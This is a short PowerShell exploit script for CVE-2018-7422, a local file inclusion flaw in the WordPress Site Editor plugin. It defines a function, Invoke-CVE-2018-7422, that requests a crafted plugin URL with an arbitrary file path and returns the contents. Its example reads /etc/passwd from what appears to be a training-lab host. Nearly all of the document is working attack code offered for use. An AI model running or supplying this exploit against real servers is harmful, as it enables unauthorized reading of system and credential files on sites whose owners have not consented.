<#
.SYNOPSIS
This exploit script executes the vulnerability named CVE-2018-7422, which is a kind of Local File Inclusion.

.EXAMPLE
Retrieves the file "/etc/passwd" from affected server.
     
    Invoke-CVE-2018-7422 -WordpressURL "http://tnhhg5f6d6josqdqqnxzzhs91.public1.attackdefenselabs.com" -File "/etc/passwd"

#>
function Invoke-CVE-2018-7422
{
    Param(
        [Parameter(Mandatory = $true, Position = 1)]
        [string]$WordpressURL,

        [Parameter(Mandatory = $true, Position = 2)]
        [string]$File
    )
    return (Invoke-WebRequest -URI "$WordpressURL/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=$File").Content
}